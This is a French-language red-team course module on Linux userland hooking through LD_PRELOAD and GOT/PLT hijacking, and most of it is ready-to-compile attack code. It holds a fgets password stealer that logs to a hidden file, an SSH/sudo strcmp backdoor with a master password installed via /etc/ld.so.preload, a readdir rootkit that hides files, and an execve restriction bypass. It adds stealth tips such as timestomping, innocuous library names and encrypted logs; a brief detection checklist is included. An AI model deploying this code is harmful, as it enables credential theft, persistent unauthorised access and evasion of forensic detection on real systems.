# Module L10 : Syscall Hooking Userland - LD_PRELOAD et GOT/PLT Hijacking

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre le mécanisme de liaison dynamique Linux
- [ ] Implémenter des hooks LD_PRELOAD pour intercepter des fonctions
- [ ] Manipuler la GOT (Global Offset Table) et la PLT (Procedure Linkage Table)
- [ ] Créer des backdoors furtives via hooking de syscalls
- [ ] Bypasser les détections anti-hooking

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- Le format ELF et la structure des binaires Linux (Module L02)
- Les appels système Linux (Module L01)
- La compilation et le link

## Introduction

Le **hooking de syscalls en userland** consiste à intercepter les appels aux fonctions systèmes avant qu'ils n'atteignent le noyau. Cette technique permet de modifier, bloquer ou enregistrer les appels sans toucher au kernel.

### Pourquoi ce sujet est important ?

En Red Team, le hooking userland permet de :
- **Intercepter des données sensibles** (mots de passe, clés SSH, etc.)
- **Masquer des fichiers/processus** de manière transparente
- **Implanter des backdoors** dans des processus existants
- **Bypasser certaines protections** basées sur la libc
- **Rester furtif** sans nécessiter de privilèges root

```
ANALOGIE :
┌──────────────────────────────────────────────────┐
│  Imaginez un immeuble avec un concierge          │
│                                                  │
│  Normalement:                                    │
│  Vous → Concierge → Propriétaire                 │
│                                                  │
│  Avec hooking:                                   │
│  Vous → FAUX Concierge → Vrai Concierge → ...   │
│         (intercepte tout)                        │
│                                                  │
│  Le faux concierge peut:                         │
│  - Lire votre courrier                           │
│  - Modifier vos messages                         │
│  - Bloquer certaines communications              │
│  - Vous faire croire à de fausses choses         │
└──────────────────────────────────────────────────┘
```

## Concepts fondamentaux

### Concept 1 : La liaison dynamique Linux

Quand un programme appelle `printf()`, voici ce qui se passe :

```
APPLICATION UTILISANT LA LIBC
┌────────────────────────────────────────────────┐
│  Programme:  main.c                            │
│                                                │
│  int main() {                                  │
│      printf("Hello\n");  ← Appel fonction     │
│  }                                             │
└────────────────────────────────────────────────┘
         │
         ↓ Compilation
┌────────────────────────────────────────────────┐
│  Binary: a.out                                 │
│  ┌──────────────────────────────────────┐    │
│  │  .text (code)                         │    │
│  │    call printf@PLT  ← Appel indirect  │    │
│  │                                       │    │
│  │  .plt (Procedure Linkage Table)       │    │
│  │    [printf@PLT]:                      │    │
│  │      jmp *printf@GOT  ← Saut GOT      │    │
│  │                                       │    │
│  │  .got (Global Offset Table)           │    │
│  │    printf@GOT: 0x7f... ← Adresse libc │    │
│  └──────────────────────────────────────┘    │
└────────────────────────────────────────────────┘
         │
         ↓ Runtime
┌────────────────────────────────────────────────┐
│  libc.so.6 (bibliothèque partagée)            │
│  ┌──────────────────────────────────────┐    │
│  │  Adresse 0x7f1234:                    │    │
│  │    printf() { ... }  ← Vraie fonction │    │
│  └──────────────────────────────────────┘    │
└────────────────────────────────────────────────┘
```

**Flux d'appel** :
```
1. main.c : printf("Hello")
2. Binary : call printf@PLT
3. PLT : jmp *printf@GOT
4. GOT : contient adresse de printf dans libc
5. libc.so.6 : exécution de printf()
```

### Concept 2 : LD_PRELOAD - Précharger une bibliothèque

`LD_PRELOAD` est une variable d'environnement qui force le chargement d'une bibliothèque AVANT toutes les autres.

```
SANS LD_PRELOAD :
┌──────────────────────────────────┐
│  Programme                       │
│     ↓                            │
│  libc.so.6 (fonctions standard)  │
│     ↓                            │
│  Kernel                          │
└──────────────────────────────────┘

AVEC LD_PRELOAD :
┌──────────────────────────────────┐
│  Programme                       │
│     ↓                            │
│  malicious.so ← Notre hook!      │ ← Prioritaire
│     ↓                            │
│  libc.so.6                       │
│     ↓                            │
│  Kernel                          │
└──────────────────────────────────┘
```

**Principe** : Si notre bibliothèque définit `printf()`, le programme utilisera NOTRE version au lieu de celle de la libc.

### Concept 3 : GOT/PLT Hijacking

La **GOT** (Global Offset Table) contient les adresses des fonctions externes.

```
STRUCTURE DE LA GOT:
┌─────────────────────────────────────┐
│  Adresse  │  Fonction  │  Valeur    │
├───────────┼────────────┼────────────┤
│  0x601018 │  printf@GOT│ 0x7f123400 │ ← Pointe vers libc
│  0x601020 │  read@GOT  │ 0x7f123500 │
│  0x601028 │  write@GOT │ 0x7f123600 │
└─────────────────────────────────────┘

APRÈS HIJACKING:
┌─────────────────────────────────────┐
│  Adresse  │  Fonction  │  Valeur    │
├───────────┼────────────┼────────────┤
│  0x601018 │  printf@GOT│ 0x400900   │ ← Notre hook!
│  0x601020 │  read@GOT  │ 0x400950   │ ← Notre hook!
│  0x601028 │  write@GOT │ 0x7f123600 │ (inchangé)
└─────────────────────────────────────┘
```

## Mise en pratique

### Étape 1 : Hook basique avec LD_PRELOAD

Créons un hook qui intercepte tous les appels à `write()` :

```c
// hook_write.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

// Pointeur vers la vraie fonction write()
static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;

// Notre version de write()
ssize_t write(int fd, const void *buf, size_t count) {
    // Initialiser real_write une seule fois
    if (!real_write) {
        real_write = dlsym(RTLD_NEXT, "write");
    }

    // Loguer l'appel
    char log[256];
    snprintf(log, sizeof(log), "[HOOK] write(fd=%d, count=%zu)\n", fd, count);
    real_write(2, log, strlen(log));  // Écrire sur stderr

    // Appeler la vraie fonction
    return real_write(fd, buf, count);
}
```

**Compilation** :
```bash
gcc -shared -fPIC -o hook_write.so hook_write.c -ldl
```

**Utilisation** :
```bash
# Tester avec n'importe quel programme
LD_PRELOAD=./hook_write.so ls

# Résultat :
# [HOOK] write(fd=1, count=...)
# [HOOK] write(fd=1, count=...)
# fichier1  fichier2  fichier3  ...
```

### Étape 2 : Hook sophistiqué - Voler les mots de passe

Interceptons `fgets()` pour capturer les entrées utilisateur :

```c
// password_stealer.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

static char* (*real_fgets)(char *s, int size, FILE *stream) = NULL;

char* fgets(char *s, int size, FILE *stream) {
    if (!real_fgets) {
        real_fgets = dlsym(RTLD_NEXT, "fgets");
    }

    // Appeler la vraie fonction
    char *result = real_fgets(s, size, stream);

    if (result != NULL) {
        // Loguer le contenu dans fichier caché
        FILE *log = fopen("/tmp/.passwords.log", "a");
        if (log) {
            time_t now = time(NULL);
            fprintf(log, "[%s] PID %d: %s",
                    ctime(&now), getpid(), s);
            fclose(log);
        }
    }

    return result;
}
```

**Test** :
```bash
gcc -shared -fPIC -o stealer.so password_stealer.c -ldl

# Lancer un programme qui demande un password
LD_PRELOAD=./stealer.so sudo -k && sudo ls

# Les passwords sont sauvegardés dans /tmp/.passwords.log
cat /tmp/.passwords.log
```

### Étape 3 : GOT Overwrite en runtime

Modifier la GOT directement depuis le programme :

```c
// got_hijack.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>

// Notre fonction de remplacement
int fake_puts(const char *s) {
    printf("[HOOKED] puts() called with: %s\n", s);
    return 0;
}

// Trouver l'adresse de la GOT entry pour puts
void** find_got_entry(const char *func_name) {
    // Parcourir les sections ELF
    FILE *maps = fopen("/proc/self/maps", "r");
    char line[256];
    unsigned long base_addr = 0;

    while (fgets(line, sizeof(line), maps)) {
        if (strstr(line, "r-x")) {  // Section exécutable
            sscanf(line, "%lx", &base_addr);
            break;
        }
    }
    fclose(maps);

    // Parser ELF header
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)base_addr;
    Elf64_Phdr *phdr = (Elf64_Phdr *)(base_addr + ehdr->e_phoff);

    // Chercher segment DYNAMIC
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_DYNAMIC) {
            Elf64_Dyn *dyn = (Elf64_Dyn *)(base_addr + phdr[i].p_vaddr);

            // Chercher GOT
            for (; dyn->d_tag != DT_NULL; dyn++) {
                if (dyn->d_tag == DT_PLTGOT) {
                    void **got = (void **)(dyn->d_un.d_ptr);
                    return got;  // Simplifié pour l'exemple
                }
            }
        }
    }

    return NULL;
}

int main() {
    printf("Before hook:\n");
    puts("Hello from puts!");

    // Trouver et modifier la GOT
    void **got_puts = find_got_entry("puts");

    if (got_puts) {
        // Rendre la GOT writable
        mprotect((void*)((unsigned long)got_puts & ~0xFFF),
                 4096, PROT_READ | PROT_WRITE);

        // Remplacer l'adresse
        *got_puts = (void*)fake_puts;
    }

    printf("\nAfter hook:\n");
    puts("Hello from puts!");  // Appellera fake_puts()

    return 0;
}
```

## Application offensive

### Contexte Red Team

#### 1. Backdoor SSH via LD_PRELOAD

Intercepter les mots de passe SSH :

```c
// ssh_backdoor.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>

static int (*real_strcmp)(const char *s1, const char *s2) = NULL;

int strcmp(const char *s1, const char *s2) {
    if (!real_strcmp) {
        real_strcmp = dlsym(RTLD_NEXT, "strcmp");
    }

    // Si c'est une comparaison de password
    if (strstr(s1, "password") || strstr(s2, "password")) {
        FILE *log = fopen("/tmp/.ssh_backdoor", "a");
        if (log) {
            fprintf(log, "Password attempt: %s vs %s\n", s1, s2);
            fclose(log);
        }

        // Accepter notre backdoor password
        if (strcmp(s2, "BACKDOOR_P@SS") == 0) {
            return 0;  // Match!
        }
    }

    return real_strcmp(s1, s2);
}
```

**Installation** :
```bash
gcc -shared -fPIC -o ssh_hook.so ssh_backdoor.c -ldl

# Ajouter à /etc/ld.so.preload (nécessite root)
echo "/path/to/ssh_hook.so" >> /etc/ld.so.preload

# Maintenant "BACKDOOR_P@SS" fonctionne pour tous les users
```

#### 2. Rootkit userland - Cacher des fichiers

```c
// hide_files.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

static struct dirent* (*real_readdir)(DIR *dirp) = NULL;

struct dirent* readdir(DIR *dirp) {
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        // Cacher les fichiers qui commencent par ".hidden_"
        if (strncmp(entry->d_name, ".hidden_", 8) == 0) {
            continue;  // Sauter ce fichier
        }
        return entry;
    }

    return NULL;
}
```

**Test** :
```bash
gcc -shared -fPIC -o hide_files.so hide_files.c -ldl

touch /tmp/.hidden_malware
ls /tmp  # Visible

LD_PRELOAD=./hide_files.so ls /tmp  # Invisible!
```

#### 3. Bypasser restrictions de commandes

```c
// bypass_exec.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>

static int (*real_execve)(const char *path, char *const argv[],
                          char *const envp[]) = NULL;

int execve(const char *path, char *const argv[], char *const envp[]) {
    if (!real_execve) {
        real_execve = dlsym(RTLD_NEXT, "execve");
    }

    // Si on essaie d'exécuter une commande bloquée
    if (strstr(path, "restricted_cmd")) {
        // Remplacer par notre version
        return real_execve("/bin/sh", argv, envp);
    }

    return real_execve(path, argv, envp);
}
```

### Considérations OPSEC

**Détection** :
- `/etc/ld.so.preload` est surveillé par les EDR
- `ldd` révèle les bibliothèques préchargées
- Checksums des bibliothèques système

**Contre-mesures** :
```bash
# Vérifier LD_PRELOAD actif
env | grep LD_PRELOAD

# Lister bibliothèques chargées
ldd /bin/ls

# Vérifier /etc/ld.so.preload
cat /etc/ld.so.preload

# Comparer checksums
md5sum /lib/x86_64-linux-gnu/libc.so.6
```

**Techniques de furtivité** :
1. **Hook les fonctions de détection** elles-mêmes
2. **Nom de fichier légitime** : `libc-extra.so`
3. **Timestamps corrects** : `touch -r /lib/libc.so.6 malicious.so`
4. **Chiffrer les logs** pour éviter détection forensics

### Limitations et bypasses

**Limitations de LD_PRELOAD** :
- Ne fonctionne pas sur binaires SUID/SGID (sécurité)
- Peut être désactivé avec `unsetenv("LD_PRELOAD")`
- Détecté par `ldd`, `/proc/PID/maps`

**Alternative : GOT hijacking direct** :
- Plus furtif (pas dans ld.so.preload)
- Nécessite modifier mémoire process
- Nécessite souvent ptrace ou /proc/mem

## Exemples avancés

### Hook avec chaînage de fonctions

```c
// chain_hooks.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

static void* (*real_malloc)(size_t size) = NULL;
static void (*real_free)(void *ptr) = NULL;

void* malloc(size_t size) {
    if (!real_malloc) {
        real_malloc = dlsym(RTLD_NEXT, "malloc");
    }

    // Loguer allocation
    fprintf(stderr, "[MALLOC] %zu bytes\n", size);

    void *ptr = real_malloc(size);

    // Loguer adresse allouée
    fprintf(stderr, "[MALLOC] Got address: %p\n", ptr);

    return ptr;
}

void free(void *ptr) {
    if (!real_free) {
        real_free = dlsym(RTLD_NEXT, "free");
    }

    fprintf(stderr, "[FREE] Freeing: %p\n", ptr);
    real_free(ptr);
}
```

### Hook avec état global

```c
// stateful_hook.c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <unistd.h>
#include <stdio.h>

static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;
static int read_count = 0;

ssize_t read(int fd, void *buf, size_t count) {
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
    }

    read_count++;

    // Après 100 reads, injecter donnée malveillante
    if (read_count == 100) {
        fprintf(stderr, "[HOOK] Injecting malicious data!\n");
        // Modifier buf avant retour
    }

    return real_read(fd, buf, count);
}
```

## Résumé

### Points clés

```
HOOKING USERLAND :

1. LD_PRELOAD
   ├─ Précharge bibliothèque avant libc
   ├─ Interception transparente
   ├─ Facile à implémenter
   └─ Détectable (/etc/ld.so.preload)

2. GOT/PLT Hijacking
   ├─ Modification directe de la GOT
   ├─ Plus furtif que LD_PRELOAD
   ├─ Nécessite accès mémoire process
   └─ Bypass RELRO avec ptrace

3. Applications Red Team
   ├─ Vol de credentials
   ├─ Backdoors SSH/sudo
   ├─ Rootkits userland
   └─ Bypass de restrictions
```

### Checklist

- [ ] Comprendre liaison dynamique (PLT/GOT)
- [ ] Créer hook LD_PRELOAD basique
- [ ] Intercepter fonctions libc (read, write, etc.)
- [ ] Modifier la GOT en runtime
- [ ] Implémenter backdoor SSH via hooking
- [ ] Cacher fichiers avec readdir() hook
- [ ] Connaître techniques de détection
- [ ] Savoir bypasser protections LD_PRELOAD

## Ressources complémentaires

- [ELF Format Specification](https://refspecs.linuxfoundation.org/elf/elf.pdf)
- [ld.so man page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [PLT and GOT - The key to code sharing](https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html)
- [Linux Rootkits Explained](https://github.com/milabs/awesome-linux-rootkits)

---

**Navigation**
- [Module précédent : L09 Process Injection](../L09_process_injection_linux/)
- [Module suivant : L11 Anti-Debug Linux](../L11_anti_debug_linux/)
